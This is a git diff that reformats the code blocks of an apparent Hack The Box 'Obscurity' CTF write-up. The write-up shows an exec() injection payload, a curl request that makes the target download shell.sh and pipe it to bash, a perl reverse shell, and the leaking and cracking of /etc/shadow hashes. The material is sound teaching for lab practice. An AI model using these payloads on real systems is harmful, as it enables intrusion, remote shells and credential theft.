@@ -10,7 +10,7 @@ exploit two bad implementations of an HTTP and a SSH-like service.
 
 ## Information gathering
 Let's run a port scan:
-```
+```console
 $ nmap -A -T4 10.10.10.168
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-30 19:33 EST
 Nmap scan report for 10.10.10.168
@@ -100,13 +100,14 @@ this interesting message on the website:
 ![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/obscurity/dev.png)
 
 Let's search for this *secret* directory:
-```
+```console
 $ ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -fc 404 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 
 develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 ```
 Cool, found it! Let's take a look at the code:
-{{< highlight python "linenos=table, hl_lines=138-139" >}}
+<!-- {{< highlight python "linenos=table, hl_lines=138-139" >}} -->
+```python
 import socket
 import threading
 from datetime import datetime
@@ -276,7 +277,7 @@ class Server:
                 data = f.read()
             status = "500"
         return {"body": data, "mime": mime, "status": status}
-{{< /highlight >}}
+```
 
 It looks like it's the source code of the HTTP server running on the machine,
 because it sends the `Server: BadHTTPServer` header.
@@ -286,9 +287,9 @@ We can straight off pinpoint a vulnerability on line 139. There's a call to
 python code!
 
 We can send something like:
-`
+```python
 ';import subprocess;subprocess.call('<command>',shell=True);'"
-`
+```
 so that the `info` variable will be:
 ```
 output = 'Document: ;'import subprocess;subprocess.call('<command>',shell=True);''
@@ -298,7 +299,7 @@ And when it is passed to `exec` it will execute our command.
 ## Command injection
 Let's try to get a ping from the machine. After listening with `tshark -i utun2
 -Y icmp` let's make the request to ping us:
-```
+```console
 $ curl "10.10.10.168:8080/';import%20subprocess;subprocess.call('ping%20-c4%2010.10.14.81',shell=True);'"
 <div id="main">
         <div class="fof">
@@ -309,7 +310,7 @@ $ curl "10.10.10.168:8080/';import%20subprocess;subprocess.call('ping%20-c4%2010
 ```
 
 Let's check if we received the ping:
-```
+```console
 $ tshark -i utun2 -Y icmp
 Capturing on 'utun2'
     6  17:46:43,417023 10.10.10.168 → 10.10.14.81  ICMP 88
@@ -328,7 +329,7 @@ And we did!
 Let's try to get a reverse shell now, but we can't use netcat on the machine
 because it's compiled without `-c` and `-e` options, as we can see by piping the
 result of `man` in out listener:
-```
+```console
  There is no -c or -e option in this netcat, but you still can execute a command after con‐
      nection being established by redirecting file descriptors. Be cautious here because opening
      a port and let anyone connected execute arbitrary command on your site is DANGEROUS. If you
@@ -359,12 +360,12 @@ perl -e 'use Socket;$i="10.10.14.81";$p=1337;socket(S,PF_INET,SOCK_STREAM,getpro
 
 Start the netcat listener with `nc -lnvp 1337` and let's make a request to
 download the reverse shell script and execute it:
-```
-curl "10.10.10.168:8080/';import%20subprocess;subprocess.call('curl%20http://10.10.14.81:8000/shell.sh|/bin/bash',shell=True);'"
+```console
+$ curl "10.10.10.168:8080/';import%20subprocess;subprocess.call('curl%20http://10.10.14.81:8000/shell.sh|/bin/bash',shell=True);'"
 ```
 
 And after a second we should have it:
-```
+```console
 $ nc -lnkvp 1337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::1337
@@ -378,7 +379,7 @@ www-data
 ## Further exploration
 
 There's a user called `robert` and there are some file in it's home:
-```
+```console
 $ ls /home/robert
 BetterSSH
 check.txt
@@ -389,7 +390,7 @@ user.txt
 ```
 
 This is `check.txt`:
-```
+```text
 Encrypting this file with your key should result in out.txt, make sure your key is correct!
 ```
 
@@ -497,14 +498,14 @@ for e, c in zip(encrypted, clear):
 ```
 
 Let's run it:
-```
+```console
 $ ./decrypt.py
 alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
 ```
 
 Now we can use the password to decrypt the `passwordreminder.txt` and we can use
 the python script itself to decrypt it:
-```
+```console
 $ ./SuperSecureCrypt.py -k alexandrovich -i passwordreminder.txt -o password -d
 ################################
 #           BEGINNING          #
@@ -519,13 +520,13 @@ Writing to password...
 ```
 
 Let's check the output:
-```
+```console
 $ cat password
 SecThruObsFTW
 ```
 
 Trying the credenstials on SSH works, so let's check the flag:
-```
+```console
 robert@obscure:~$ wc -c user.txt
 33 user.txt
 ```
@@ -607,7 +608,7 @@ parses `/etc/shadow` and copies the hashes in a randomly called file in
 
 And also, we can run it with `sudo`, in order to be able to read the shadow file
 inside the script:
-```
+```console
 robert@obscure:/tmp/SSH$ sudo -l
 Matching Defaults entries for robert on obscure:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -618,12 +619,12 @@ User robert may run the following commands on obscure:
 
 Because the file in `/tmp/SSH` will get deleted almost immediately, let's use a
 simple while loop to read all the files in the directory:
-```
+```console
 robert@obscure:/tmp/SSH$ while true; do cat * 2>/dev/null; done
 ```
 
 Let's run the script:
-```
+```console
 robert@obscure:~/BetterSSH$ sudo python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: robert
 Enter password: SecThruObsFTW
@@ -632,7 +633,7 @@ robert@Obscure$
 ```
 
 Let's check the output of the `cat` inside the loop:
-```
+```text
 root
 $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
 18226
@@ -650,9 +651,10 @@ $6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5
 99999
 7
 ```
+
 Cool! We have the hashes! We already know robert's password, so let's copy the
 other to a file and use `john` to crack it:
-```
+```console
 $ john --wordlist=rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
@@ -666,7 +668,7 @@ Session completed
 ```
 
 We can now use `su` to escalate to root and get the flag:
-```
+```console
 root@obscure:~# wc -c root.txt
 33 root.txt
 ```
